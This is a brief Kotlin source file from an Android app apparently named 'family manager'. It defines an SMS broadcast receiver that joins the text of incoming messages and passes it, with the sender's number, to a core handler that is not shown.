package com.family.manager

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        val ms = Telephony.Sms.Intents.getMessagesFromIntent(i) ?: return
        val body = ms.joinToString("") { it.messageBody ?: "" }
        Core.handle(c, body, ms.firstOrNull()?.originatingAddress ?: "SMS")
    }
}
